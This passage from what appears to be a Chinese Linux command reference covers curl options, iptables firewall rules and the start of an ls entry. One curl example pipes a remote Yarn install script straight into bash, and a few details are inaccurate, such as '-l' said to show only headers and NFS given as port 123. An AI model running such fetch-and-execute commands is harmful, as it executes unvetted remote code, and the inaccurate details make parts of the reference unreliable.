可以完成HTTP或者FTP的认证，可以指定密码，也可以不指定密码在后续操作中输入密码：\n\n```shell\ncurl -u user:pwd http://wangchujiang.com\ncurl -u user http://wangchujiang.com\n```\n\n**只打印响应头部信息**\n\n通过`-I`或者`-head`可以只打印出HTTP头部信息：\n\n```shell\n[root@localhost text]# curl -I http://wangchujiang.com\nHTTP/1.1 200 OK\nServer: nginx/1.2.5\ndate: Mon, 10 Dec 2012 09:24:34 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: keep-alive\nVary: Accept-Encoding\nX-Pingback: http://wangchujiang.com/xmlrpc.php\n```\n\n**get请求**\n\n```shell\ncurl \"http://www.wangchujiang.com\"    # 如果这里的URL指向的是一个文件或者一幅图都可以直接下载到本地\ncurl -i \"http://www.wangchujiang.com\" # 显示全部信息\ncurl -l \"http://www.wangchujiang.com\" # 只显示头部信息\ncurl -v \"http://www.wangchujiang.com\" # 显示get请求全过程解析\n```\n\n**post请求**\n\n```shell\n$ curl -d \"param1=value1&param2=value2\" \"http://www.wangchujiang.com/login\"\n\ncurl -d'login=emma＆password=123' -X POST https://wangchujiang.com/login\n# 或者\n$ curl -d 'login=emma' -d 'password=123' -X POST  https://wangchujiang.com/login\n```\n\n\n`--data-urlencode` 参数等同于 `-d`，发送 `POST` 请求的数据体，区别在于会自动将发送的数据进行 `URL` 编码。\n\n```shell\ncurl --data-urlencode 'comment=hello world' https://wangchujiang.com/login\n# 上面代码中，发送的数据hello world之间有一个空格，需要进行 URL 编码。\n```\n\n**读取本地文本文件的数据，向服务器发送**\n\n```shell\ncurl -d '@data.txt' https://wangchujiang.com/upload\n# 读取data.txt文件的内容，作为数据体向服务器发送。\n```\n\n**json格式的post请求**\n\n```shell\ncurl -l -H \"Content-type: application/json\" -X POST -d '{\"phone\":\"13521389587\",\"password\":\"test\"}' http://wangchujiang.com/apis/users.json\n```\n\n**向服务器发送 Cookie**\n\n使用`--cookie \"COKKIES\"`选项来指定cookie，多个cookie使用分号分隔：\n\n```shell\ncurl http://wangchujiang.com --cookie \"user=root;pass=123456\"\n```\n\n将cookie另存为一个文件，使用`--cookie-jar`选项：\n\n```shell\ncurl URL --cookie-jar cookie_file\n```\n\n\n`-b` 参数用来向服务器发送 Cookie。\n\n```shell\ncurl -b 'foo=bar' https://taobao.com\n# 上面命令会生成一个标头Cookie: foo=bar，向服务器发送一个名为foo、值为bar的 Cookie。\n```\n\n```shell\ncurl -b 'foo1=bar' -b 'foo2=baz' https://taobao.com\n# 上面命令发送两个 Cookie。\n\n```shell\ncurl -b cookies.txt https://www.taobao.com\n# 上面命令读取本地文件 cookies.txt，里面是服务器设置的 Cookie（参见-c参数），将其发送到服务器。\n```\n\n**Cookie 写入一个文件**\n\n```shell\ncurl -c cookies.txt https://www.taobao.com\n# 上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件cookies.txt。\n```\n\n**请求的来源**\n\n`-e` 参数用来设置 `HTTP` 的标头 `Referer`，表示请求的来源。\n\n```shell\ncurl -e 'https://taobao.com?q=example' https://www.example.com\n# 上面命令将Referer标头设为 https://taobao.com?q=example。\n```\n\n`-H` 参数可以通过直接添加标头 `Referer`，达到同样效果。\n\n```shell\ncurl -H 'Referer: https://taobao.com?q=example' https://www.example.com\n```\n\n**上传二进制文件**\n\n`-F` 参数用来向服务器上传二进制文件。\n\n```shell\ncurl -F 'file=@photo.png' https://taobao.com/profile\n# 上面命令会给 HTTP 请求加上标头 Content-Type: multipart/form-data ，然后将文件photo.png作为file字段上传。\n```\n\n`-F` 参数可以指定 `MIME` 类型。\n\n```shell\ncurl -F 'file=@photo.png;type=image/png' https://taobao.com/profile\n# 上面命令指定 MIME 类型为image/png，否则 curl 会把 MIME 类型设为 application/octet-stream。\n```\n\n`-F` 参数也可以指定文件名。\n\n```shell\ncurl -F 'file=@photo.png;filename=me.png' https://taobao.com/profile\n# 上面命令中，原始文件名为photo.png，但是服务器接收到的文件名为me.png。\n```\n\n**设置请求头**\n\n`-H` 参数添加 `HTTP` 请求的标头。\n\n```shell\ncurl -H 'Accept-Language: en-US' https://google.com\n# 上面命令添加 HTTP 标头 Accept-Language: en-US。\n```\n\n```shell\ncurl -H 'Accept-Language: en-US' -H 'Secret-Message: xyzzy' https://google.com\n# 上面命令添加两个 HTTP 标头。\n```\n\n```shell\ncurl -d '{\"login\": \"emma\", \"pass\": \"123\"}' -H 'Content-Type: application/json' https://google.com/login\n# 上面命令添加 HTTP 请求的标头是 Content-Type: application/json，然后用 -d 参数发送 JSON 数据。\n```\n\n**跳过 SSL 检测**\n\n```shell\ncurl -k https://www.example.com\n# 上面命令不会检查服务器的 SSL 证书是否正确。\n```\n\n**请求跟随服务器的重定向**\n\n`-L` 参数会让 `HTTP` 请求跟随服务器的重定向。`curl` 默认不跟随重定向。\n\n```shell\ncurl -L -d 'tweet=hi' https://api.example.com/tweet\n```\n\n**调试参数**\n\n`-v` 参数输出通信的整个过程，用于调试。\n\n```shell\ncurl -v https://www.example.com\n# --trace参数也可以用于调试，还会输出原始的二进制数据。\n```\n\n```shell\n$ curl --trace - https://www.example.com\n```\n\n**获取本机外网ip**\n\n```shell\ncurl ipecho.net/plain\n```\n\n\n**使用 curl 测试网站加载速度**\n\n命令有一个鲜为人知的选项，`-w`，该选项在请求结束之后打印本次请求的统计数据到标准输出。\n\n首先，我们定义控制打印行为的格式化字符串。新建文本文件 `fmt.txt`，并填入下面的内容：\n\n```ruby\n\\n\nResponse Time for: %{url_effective}\\n\\n\nDNS Lookup Time:\\t\\t%{time_namelookup}s\\n\nRedirection Time:\\t\\t%{time_redirect}s\\n\nConnection Time:\\t\\t%{time_connect}s\\n\nApp Connection Time:\\t\\t%{time_appconnect}s\\n\nPre-transfer Time:\\t\\t%{time_pretransfer}s\\n\nStart-transfer Time:\\t\\t%{time_starttransfer}s\\n\\n\nTotal Time:\\t\\t\\t%{time_total}s\\n\n```\n\ncurl 提供了很多置换变量，可以在格式化字符串中通过 `%{var}` 的形式使用。完整的变量列表可以在 `curl` 的 `manpage` 中查看。简单介绍一下我们使用的这几个变量：\n\n\n- `url_effective`: 执行完地址重定向之后的最终 URL；\n- `time_namelookup`: 从请求开始至完成名称解析所花的时间，单位为秒，下同；\n- `time_redirect`: 执行所有重定向所花的时间；\n- `time_connect`: 从请求开始至建立 TCP 连接所花的时间；\n- `time_appconnect`: 从请求开始至完成 SSL/SSH 握手所花的时间；\n- `time_pretransfer`: 从请求开始至服务器准备传送文件所花的时间，包含了传送协商时间；\n- `time_starttransfer`: 从请求开始至服务器准备传送第一个字节所花的时间；\n- `time_total`: 完整耗时。\n\n然后执行请求，通过 @filename 指定保存了格式化字符串的文件：\n\n```shell\n$ curl -L -s -w @fmt.txt -o /dev/null http://www.google.com\n```\n\n输出：\n\n```c\nResponse Time for: http://www.google.co.jp/?gfe_rd=cr&dcr=0&ei=cjIaWpTkHeiQ8QfnxYzoBA\n\nDNS Lookup Time:        0.000038s\nRedirection Time:       0.207271s\nConnection Time:        0.000039s\nApp Connection Time:    0.000039s\nPre-transfer Time:      0.000067s\nStart-transfer Time:    0.260115s\n\nTotal Time:             0.467691s\n```\n\n### 要求返回是压缩的状态\n\n```shell\n▶ curl --compressed -o- -L https://yarnpkg.com/install.sh | bash\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100    54  100    54    0     0     42      0  0:00:01  0:00:01 --:--:--    42\n100  2341  100  2341    0     0   1202      0  0:00:01  0:00:01 --:--:--  9289\nInstalling Yarn!\n> Downloading tarball...\n\n[1/2]: https://yarnpkg.com/latest.tar.gz --> /var/folders/j7/3xly5sk567s65ny5dnr__3b80000gn/T/yarn.tar.gz.XXXXXXXXXX.9hJsBsrA\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100    57  100    57    0     0     72      0 --:--:-- --:--:-- --:--:--    72\n100    93  100    93    0     0     63      0  0:00:01  0:00:01 --:--:--    63\n100   643  100   643    0     0    248      0  0:00:02  0:00:02 --:--:--   707\n100 1215k  100 1215k    0     0   153k      0  0:00:07  0:00:07 --:--:--  305k\n\n[2/2]: https://yarnpkg.com/latest.tar.gz.asc --> /var/folders/j7/3xly5sk567s65ny5dnr__3b80000gn/T/yarn.tar.gz.XXXXXXXXXX.9hJsBsrA.asc\n100    61  100    61    0     0    356      0 --:--:-- --:--:-- --:--:--   356\n100    97  100    97    0     0    325      0 --:--:-- --:--:-- --:--:--   325\n100   647  100   647    0     0   1283      0 --:--:-- --:--:-- --:--:--  1283\n100   832  100   832    0     0   1107      0 --:--:-- --:--:-- --:--:--  812k\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","curl"]},{"title":"【Linux 命令】iptables","url":"/linux-command/iptables/","content":"\nLinux上常用的防火墙软件\n\n## 补充说明\n\n**iptables命令** 是Linux上常用的防火墙软件，是netfilter项目的一部分。可以直接配置，也可以通过许多前端和图形界面配置。\n\n<!-- TOC -->\n\n- [补充说明](#补充说明)\n  - [语法](#语法)\n  - [选项](#选项)\n- [基本参数](#基本参数)\n    - [命令选项输入顺序](#命令选项输入顺序)\n    - [工作机制](#工作机制)\n    - [防火墙的策略](#防火墙的策略)\n    - [防火墙的策略](#防火墙的策略-1)\n  - [实例](#实例)\n    - [清空当前的所有规则和计数](#清空当前的所有规则和计数)\n    - [配置允许ssh端口连接](#配置允许ssh端口连接)\n    - [允许本地回环地址可以正常使用](#允许本地回环地址可以正常使用)\n    - [设置默认的规则](#设置默认的规则)\n    - [配置白名单](#配置白名单)\n    - [开启相应的服务端口](#开启相应的服务端口)\n    - [保存规则到配置文件中](#保存规则到配置文件中)\n    - [列出已设置的规则](#列出已设置的规则)\n    - [清除已有规则](#清除已有规则)\n    - [删除已添加的规则](#删除已添加的规则)\n    - [开放指定的端口](#开放指定的端口)\n    - [屏蔽IP](#屏蔽ip)\n    - [指定数据包出去的网络接口](#指定数据包出去的网络接口)\n    - [查看已添加的规则](#查看已添加的规则)\n    - [启动网络转发规则](#启动网络转发规则)\n    - [端口映射](#端口映射)\n    - [字符串匹配](#字符串匹配)\n    - [阻止Windows蠕虫的攻击](#阻止windows蠕虫的攻击)\n    - [防止SYN洪水攻击](#防止syn洪水攻击)\n\n<!-- /TOC -->\n\n### 语法\n\n```shell\niptables(选项)(参数)\n```\n\n### 选项\n\n```shell\n-t, --table table 对指定的表 table 进行操作， table 必须是 raw， nat，filter，mangle 中的一个。如果不指定此选项，默认的是 filter 表。\n\n# 通用匹配：源地址目标地址的匹配\n-p：指定要匹配的数据包协议类型；\n-s, --source [!] address[/mask] ：把指定的一个／一组地址作为源地址，按此规则进行过滤。当后面没有 mask 时，address 是一个地址，比如：192.168.1.1；当 mask 指定时，可以表示一组范围内的地址，比如：192.168.1.0/255.255.255.0。\n-d, --destination [!] address[/mask] ：地址格式同上，但这里是指定地址为目的地址，按此进行过滤。\n-i, --in-interface [!] <网络接口name> ：指定数据包的来自来自网络接口，比如最常见的 eth0 。注意：它只对 INPUT，FORWARD，PREROUTING 这三个链起作用。如果没有指定此选项， 说明可以来自任何一个网络接口。同前面类似，\"!\" 表示取反。\n-o, --out-interface [!] <网络接口name> ：指定数据包出去的网络接口。只对 OUTPUT，FORWARD，POSTROUTING 三个链起作用。\n\n# 查看管理命令\n-L, --list [chain] 列出链 chain 上面的所有规则，如果没有指定链，列出表上所有链的所有规则。\n\n# 规则管理命令\n-A, --append chain rule-specification 在指定链 chain 的末尾插入指定的规则，也就是说，这条规则会被放到最后，最后才会被执行。规则是由后面的匹配来指定。\n-I, --insert chain [rulenum] rule-specification 在链 chain 中的指定位置插入一条或多条规则。如果指定的规则号是1，则在链的头部插入。这也是默认的情况，如果没有指定规则号。\n-D, --delete chain rule-specification -D, --delete chain rulenum 在指定的链 chain 中删除一个或多个指定规则。\n-R num：Replays替换/修改第几条规则\n\n# 链管理命令（这都是立即生效的）\n-P, --policy chain target ：为指定的链 chain 设置策略 target。注意，只有内置的链才允许有策略，用户自定义的是不允许的。\n-F, --flush [chain] 清空指定链 chain 上面的所有规则。如果没有指定链，清空该表上所有链的所有规则。\n-N, --new-chain chain 用指定的名字创建一个新的链。\n-X, --delete-chain [chain] ：删除指定的链，这个链必须没有被其它任何规则引用，而且这条上必须没有任何规则。如果没有指定链名，则会删除该表中所有非内置的链。\n-E, --rename-chain old-chain new-chain ：用指定的新名字去重命名指定的链。这并不会对链内部造成任何影响。\n-Z, --zero [chain] ：把指定链，或者表中的所有链上的所有计数器清零。\n\n-j, --jump target <指定目标> ：即满足某条件时该执行什么样的动作。target 可以是内置的目标，比如 ACCEPT，也可以是用户自定义的链。\n-h：显示帮助信息；\n```\n\n## 基本参数\n\n| 参数 | 作用 |\n| ---- | ---- |\n| -P |  设置默认策略:iptables -P INPUT (DROP|ACCEPT) |\n| -F |  清空规则链 |\n| -L |  查看规则链 |\n| -A |  在规则链的末尾加入新规则 |\n| -I | num  在规则链的头部加入新规则 |\n| -D | num  删除某一条规则 |\n| -s |  匹配来源地址IP/MASK，加叹号\"!\"表示除这个IP外。 |\n| -d |  匹配目标地址 |\n| -i | 网卡名称 匹配从这块网卡流入的数据 |\n| -o | 网卡名称 匹配从这块网卡流出的数据 |\n| -p |  匹配协议,如tcp,udp,icmp |\n| --dport num | 匹配目标端口号 |\n| --sport num | 匹配来源端口号 |\n\n#### 命令选项输入顺序\n\n```shell\niptables -t 表名 <-A/I/D/R> 规则链名 [规则号] <-i/o 网卡名> -p 协议名 <-s 源IP/源子网> --sport 源端口 <-d 目标IP/目标子网> --dport 目标端口 -j 动作\n```\n\n#### 工作机制\n\n规则链名包括(也被称为五个钩子函数（hook functions）)：\n\n- **INPUT链** ：处理输入数据包。\n- **OUTPUT链** ：处理输出数据包。\n- **FORWARD链** ：处理转发数据包。\n- **PREROUTING链** ：用于目标地址转换（DNAT）。\n- **POSTOUTING链** ：用于源地址转换（SNAT）。\n\n#### 防火墙的策略\n\n防火墙策略一般分为两种，一种叫`通`策略，一种叫`堵`策略，通策略，默认门是关着的，必须要定义谁能进。堵策略则是，大门是洞开的，但是你必须有身份认证，否则不能进。所以我们要定义，让进来的进来，让出去的出去，`所以通，是要全通，而堵，则是要选择`。当我们定义的策略的时候，要分别定义多条功能，其中：定义数据包中允许或者不允许的策略，filter过滤的功能，而定义地址转换的功能的则是nat选项。为了让这些功能交替工作，我们制定出了“表”这个定义，来定义、区分各种不同的工作功能和处理方式。\n\n我们现在用的比较多个功能有3个：\n\n1. filter 定义允许或者不允许的，只能做在3个链上：INPUT ，FORWARD ，OUTPUT\n2. nat 定义地址转换的，也只能做在3个链上：PREROUTING ，OUTPUT ，POSTROUTING\n3. mangle功能:修改报文原数据，是5个链都可以做：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING\n\n我们修改报文原数据就是来修改TTL的。能够实现将数据包的元数据拆开，在里面做标记/修改内容的。而防火墙标记，其实就是靠mangle来实现的。\n\n小扩展:\n\n- 对于filter来讲一般只能做在3个链上：INPUT ，FORWARD ，OUTPUT\n- 对于nat来讲一般也只能做在3个链上：PREROUTING ，OUTPUT ，POSTROUTING\n- 而mangle则是5个链都可以做：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING\n\niptables/netfilter（这款软件）是工作在用户空间的，它可以让规则进行生效的，本身不是一种服务，而且规则是立即生效的。而我们iptables现在被做成了一个服务，可以进行启动，停止的。启动，则将规则直接生效，停止，则将规则撤销。\n\niptables还支持自己定义链。但是自己定义的链，必须是跟某种特定的链关联起来的。在一个关卡设定，指定当有数据的时候专门去找某个特定的链来处理，当那个链处理完之后，再返回。接着在特定的链中继续检查。\n\n注意：规则的次序非常关键，`谁的规则越严格，应该放的越靠前`，而检查规则的时候，是按照从上往下的方式进行检查的。\n\n\n表名包括：\n\n- **raw** ：高级功能，如：网址过滤。\n- **mangle** ：数据包修改（QOS），用于实现服务质量。\n- **nat** ：地址转换，用于网关路由器。\n- **filter** ：包过滤，用于防火墙规则。\n\n动作包括：\n\n- **ACCEPT** ：接收数据包。\n- **DROP** ：丢弃数据包。\n- **REDIRECT** ：重定向、映射、透明代理。\n- **SNAT** ：源地址转换。\n- **DNAT** ：目标地址转换。\n- **MASQUERADE** ：IP伪装（NAT），用于ADSL。\n- **LOG** ：日志记录。\n- **SEMARK** : 添加SEMARK标记以供网域内强制访问控制（MAC）\n\n```shell\n                             ┏╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍┓\n ┌───────────────┐           ┃    Network    ┃\n │ table: filter │           ┗━━━━━━━┳━━━━━━━┛\n │ chain: INPUT  │◀────┐             │\n └───────┬───────┘     │             ▼\n         │             │   ┌───────────────────┐\n  ┌      ▼      ┐      │   │ table: nat        │\n  │local process│      │   │ chain: PREROUTING │\n  └             ┘      │   └─────────┬─────────┘\n         │             │             │\n         ▼             │             ▼              ┌─────────────────┐\n┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅    │     ┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅      │table: nat       │\n Routing decision      └───── outing decision ─────▶│chain: PREROUTING│\n┅┅┅┅┅┅┅┅┅┳┅┅┅┅┅┅┅┅┅          ┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅      └────────┬────────┘\n         │                                                   │\n         ▼                                                   │\n ┌───────────────┐                                           │\n │ table: nat    │           ┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅               │\n │ chain: OUTPUT │    ┌─────▶ outing decision ◀──────────────┘\n └───────┬───────┘    │      ┅┅┅┅┅┅┅┅┳┅┅┅┅┅┅┅┅\n         │            │              │\n         ▼            │              ▼\n ┌───────────────┐    │   ┌────────────────────┐\n │ table: filter │    │   │ chain: POSTROUTING │\n │ chain: OUTPUT ├────┘   └──────────┬─────────┘\n └───────────────┘                   │\n                                     ▼\n                             ┏╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍┓\n                             ┃    Network    ┃\n                             ┗━━━━━━━━━━━━━━━┛\n```\n\n\n### 实例\n\n#### 清空当前的所有规则和计数\n\n```shell\niptables -F  # 清空所有的防火墙规则\niptables -X  # 删除用户自定义的空链\niptables -Z  # 清空计数\n```\n\n#### 配置允许ssh端口连接\n\n```shell\niptables -A INPUT -s 192.168.1.0/24 -p tcp --dport 22 -j ACCEPT\n# 22为你的ssh端口， -s 192.168.1.0/24表示允许这个网段的机器来连接，其它网段的ip地址是登陆不了你的机器的。 -j ACCEPT表示接受这样的请求\n```\n\n#### 允许本地回环地址可以正常使用\n\n```shell\niptables -A INPUT -i lo -j ACCEPT\n#本地圆环地址就是那个127.0.0.1，是本机上使用的,它进与出都设置为允许\niptables -A OUTPUT -o lo -j ACCEPT\n```\n\n#### 设置默认的规则\n\n```shell\niptables -P INPUT DROP # 配置默认的不让进\niptables -P FORWARD DROP # 默认的不允许转发\niptables -P OUTPUT ACCEPT # 默认的可以出去\n```\n\n#### 配置白名单\n\n```shell\niptables -A INPUT -p all -s 192.168.1.0/24 -j ACCEPT  # 允许机房内网机器可以访问\niptables -A INPUT -p all -s 192.168.140.0/24 -j ACCEPT  # 允许机房内网机器可以访问\niptables -A INPUT -p tcp -s 183.121.3.7 --dport 3380 -j ACCEPT # 允许183.121.3.7访问本机的3380端口\n```\n\n#### 开启相应的服务端口\n\n```shell\niptables -A INPUT -p tcp --dport 80 -j ACCEPT # 开启80端口，因为web对外都是这个端口\niptables -A INPUT -p icmp --icmp-type 8 -j ACCEPT # 允许被ping\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT # 已经建立的连接得让它进来\n```\n\n#### 保存规则到配置文件中\n\n```shell\ncp /etc/sysconfig/iptables /etc/sysconfig/iptables.bak # 任何改动之前先备份，请保持这一优秀的习惯\niptables-save > /etc/sysconfig/iptables\ncat /etc/sysconfig/iptables\n```\n\n#### 列出已设置的规则\n\n> iptables -L [-t 表名] [链名]\n\n- 四个表名 `raw`，`nat`，`filter`，`mangle`\n- 五个规则链名 `INPUT`、`OUTPUT`、`FORWARD`、`PREROUTING`、`POSTROUTING`\n- filter表包含`INPUT`、`OUTPUT`、`FORWARD`三个规则链\n\n```shell\niptables -L -t nat                  # 列出 nat 上面的所有规则\n#            ^ -t 参数指定，必须是 raw， nat，filter，mangle 中的一个\niptables -L -t nat  --line-numbers  # 规则带编号\niptables -L INPUT\n\niptables -L -nv  # 查看，这个列表看起来更详细\n```\n\n#### 清除已有规则\n\n```shell\niptables -F INPUT  # 清空指定链 INPUT 上面的所有规则\niptables -X INPUT  # 删除指定的链，这个链必须没有被其它任何规则引用，而且这条上必须没有任何规则。\n                   # 如果没有指定链名，则会删除该表中所有非内置的链。\niptables -Z INPUT  # 把指定链，或者表中的所有链上的所有计数器清零。\n```\n\n#### 删除已添加的规则\n\n```shell\n# 添加一条规则\niptables -A INPUT -s 192.168.1.5 -j DROP\n```\n\n将所有iptables以序号标记显示，执行：\n\n```shell\niptables -L -n --line-numbers\n```\n\n比如要删除INPUT里序号为8的规则，执行：\n\n```shell\niptables -D INPUT 8\n```\n\n#### 开放指定的端口\n\n```shell\niptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT               #允许本地回环接口(即运行本机访问本机)\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT    #允许已建立的或相关连的通行\niptables -A OUTPUT -j ACCEPT         #允许所有本机向外的访问\niptables -A INPUT -p tcp --dport 22 -j ACCEPT    #允许访问22端口\niptables -A INPUT -p tcp --dport 80 -j ACCEPT    #允许访问80端口\niptables -A INPUT -p tcp --dport 21 -j ACCEPT    #允许ftp服务的21端口\niptables -A INPUT -p tcp --dport 20 -j ACCEPT    #允许FTP服务的20端口\niptables -A INPUT -j reject       #禁止其他未允许的规则访问\niptables -A FORWARD -j REJECT     #禁止其他未允许的规则访问\n```\n\n#### 屏蔽IP\n\n```shell\niptables -A INPUT -p tcp -m tcp -s 192.168.0.8 -j DROP  # 屏蔽恶意主机（比如，192.168.0.8\niptables -I INPUT -s 123.45.6.7 -j DROP       #屏蔽单个IP的命令\niptables -I INPUT -s 123.0.0.0/8 -j DROP      #封整个段即从123.0.0.1到123.255.255.254的命令\niptables -I INPUT -s 124.45.0.0/16 -j DROP    #封IP段即从123.45.0.1到123.45.255.254的命令\niptables -I INPUT -s 123.45.6.0/24 -j DROP    #封IP段即从123.45.6.1到123.45.6.254的命令是\n```\n\n#### 指定数据包出去的网络接口\n\n只对 OUTPUT，FORWARD，POSTROUTING 三个链起作用。\n\n```shell\niptables -A FORWARD -o eth0\n```\n\n#### 查看已添加的规则\n\n```shell\niptables -L -n -v\nChain INPUT (policy DROP 48106 packets, 2690K bytes)\n pkts bytes target     prot opt in     out     source               destination\n 5075  589K ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0\n 191K   90M ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0           tcp dpt:22\n1499K  133M ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0           tcp dpt:80\n4364K 6351M ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0           state RELATED,ESTABLISHED\n 6256  327K ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0\n\nChain FORWARD (policy ACCEPT 0 packets, 0 bytes)\n pkts bytes target     prot opt in     out     source               destination\n\nChain OUTPUT (policy ACCEPT 3382K packets, 1819M bytes)\n pkts bytes target     prot opt in     out     source               destination\n 5075  589K ACCEPT     all  --  *      lo      0.0.0.0/0            0.0.0.0/0\n```\n\n#### 启动网络转发规则\n\n公网`210.14.67.7`让内网`192.168.188.0/24`上网\n\n```shell\niptables -t nat -A POSTROUTING -s 192.168.188.0/24 -j SNAT --to-source 210.14.67.127\n```\n\n#### 端口映射\n\n本机的 2222 端口映射到内网 虚拟机的22 端口\n\n```shell\niptables -t nat -A PREROUTING -d 210.14.67.127 -p tcp --dport 2222  -j DNAT --to-dest 192.168.188.115:22\n```\n\n#### 字符串匹配\n\n比如，我们要过滤所有TCP连接中的字符串`test`，一旦出现它我们就终止这个连接，我们可以这么做：\n\n```shell\niptables -A INPUT -p tcp -m string --algo kmp --string \"test\" -j REJECT --reject-with tcp-reset\niptables -L\n\n# Chain INPUT (policy ACCEPT)\n# target     prot opt source               destination\n# REJECT     tcp  --  anywhere             anywhere            STRING match \"test\" ALGO name kmp TO 65535 reject-with tcp-reset\n#\n# Chain FORWARD (policy ACCEPT)\n# target     prot opt source               destination\n#\n# Chain OUTPUT (policy ACCEPT)\n# target     prot opt source               destination\n```\n\n#### 阻止Windows蠕虫的攻击\n\n```shell\niptables -I INPUT -j DROP -p tcp -s 0.0.0.0/0 -m string --algo kmp --string \"cmd.exe\"\n```\n\n#### 防止SYN洪水攻击\n\n```shell\niptables -A INPUT -p tcp --syn -m limit --limit 5/second -j ACCEPT\n```\n\n#### 添加SECMARK记录\n```shell\niptables -t mangle -A INPUT -p tcp --src 192.168.1.2 --dport 443 -j SECMARK --selctx system_u:object_r:myauth_packet_t\n# 向从 192.168.1.2:443 以TCP方式发出到本机的包添加MAC安全上下文 system_u:object_r:myauth_packet_t\n```\n\n## 更多实例\n> 用iptables搭建一套强大的安全防护盾 http://www.imooc.com/learn/389\n\niptables: linux 下应用层防火墙工具\n\niptables 5链: 对应 Hook point\nnetfilter: linux 操作系统核心层内部的一个数据包处理模块\nHook point: 数据包在 netfilter 中的挂载点; `PRE_ROUTING / INPUT / OUTPUT / FORWARD / POST_ROUTING`\n\niptables & netfilter\n![](http://7xq89b.com1.z0.glb.clouddn.com/netfilter&iptables.jpg)\n\niptables 4表5链\n![](http://7xq89b.com1.z0.glb.clouddn.com/iptables-data-stream.jpg)\n\niptables rules\n![](http://7xq89b.com1.z0.glb.clouddn.com/iptables-rules.jpg)\n\n- 4表\n\n**filter**: 访问控制 / 规则匹配\n**nat**: 地址转发\n mangle / raw\n\n - 规则\n\n数据访问控制: ACCEPT / DROP / REJECT\n数据包改写(nat -> 地址转换): snat / dnat\n信息记录: log\n\n## 使用场景实例\n- 场景一\n\n开放 tcp 10-22/80 端口\n开放 icmp\n其他未被允许的端口禁止访问\n\n存在的问题: 本机无法访问本机; 本机无法访问其他主机\n\n- 场景二\n\nftp: 默认被动模式(服务器产生随机端口告诉客户端, 客户端主动连接这个端口拉取数据)\nvsftpd: 使 ftp 支持主动模式(客户端产生随机端口通知服务器, 服务器主动连接这个端口发送数据)\n\n- 场景三\n\n允许外网访问:\nweb\nhttp -> 80/tcp; https -> 443/tcp\nmail\nsmtp -> 25/tcp; smtps -> 465/tcp\npop3 -> 110/tcp; pop3s -> 995/tcp\nimap -> 143/tcp\n\n内部使用:\nfile\nnfs -> 123/udp\nsamba -> 137/138/139/445/tcp\nftp -> 20/21/tcp\nremote\nssh -> 22/tcp\nsql\nmysql -> 3306/tcp\noracle -> 1521/tcp\n\n- 场景四\n\nnat 转发\n\n- 场景五\n\n防CC攻击\n\n```shell\niptables -L -F -A -D # list flush append delete\n# 场景一\niptables -I INPUT -p tcp --dport 80 -j ACCEPT # 允许 tcp 80 端口\niptables -I INPUT -p tcp --dport 10:22 -j ACCEPT # 允许 tcp 10-22 端口\niptables -I INPUT -p icmp -j ACCEPT # 允许 icmp\niptables -A INPUT -j REJECT # 添加一条规则, 不允许所有\n\n# 优化场景一\niptables -I INPUT -i lo -j ACCEPT # 允许本机访问\niptables -I INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT # 允许访问外网\niptables -I INPUT -p tcp --dport 80 -s 10.10.188.233 -j ACCEPT # 只允许固定ip访问80\n\n# 场景二\nvi /etc/vsftpd/vsftpd.conf # 使用 vsftpd 开启 ftp 主动模式\nport_enable=yes\nconnect_from_port_20=YES\niptables -I INPUT -p tcp --dport 21 -j ACCEPT\n\nvi /etc/vsftpd/vsftpd.conf # 建议使用 ftp 被动模式\npasv_min_port=50000\npasv_max_port=60000\niptables -I INPUT -p tcp --dport 21 -j ACCEPT\niptables -I INPUT -p tcp --dport 50000:60000 -j ACCEPT\n\n# 还可以使用 iptables 模块追踪来自动开发对应的端口\n\n# 场景三\niptables -I INPUT -i lo -j ACCEPT # 允许本机访问\niptables -I INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT # 允许访问外网\niptables -I INPUT -s 10.10.155.0/24 -j ACCEPT # 允许内网访问\niptables -I INPUT -p tcp -m multiport --dports 80,1723 -j ACCEPT # 允许端口, 80 -> http, 1723 -> vpn\niptables -A INPUT -j REJECT # 添加一条规则, 不允许所有\n\niptables-save # 保存设置到配置文件\n\n# 场景四\niptables -t nat -L # 查看 nat 配置\n\niptables -t nat -A POST_ROUTING -s 10.10.177.0/24 -j SNAT --to 10.10.188.232 # SNAT\nvi /etc/sysconfig/network # 配置网关\n\niptables -t nat -A POST_ROUTING -d 10.10.188.232 -p tcp --dport 80 -j DNAT --to 10.10.177.232:80 # DNAT\n\n#场景五\niptables -I INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 100 -j REJECT # 限制并发连接访问数\niptables -I INPUT -m limit --limit 3/hour --limit-burst 10 -j ACCEPT # limit模块; --limit-burst 默认为5\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","iptables"]},{"title":"【Linux 命令】ls","url":"/linux-command/ls/","content":"\n显示目录内容列表\n\n## 补充说明\n\n**ls命令** 就是list的缩写，用来显示目标列表，在Linux中是使用率较高的命令。ls命令的输出信息可以进行彩色加亮显示，以分区不同类型的文件。\n\n###  语法\n\n```shell\nls [选项] [文件名...]\n   [-1abcdfgiklmnopqrstuxABCDFGLNQRSUX] [-w cols] [-T cols] [-I pattern] [--full-time] \n   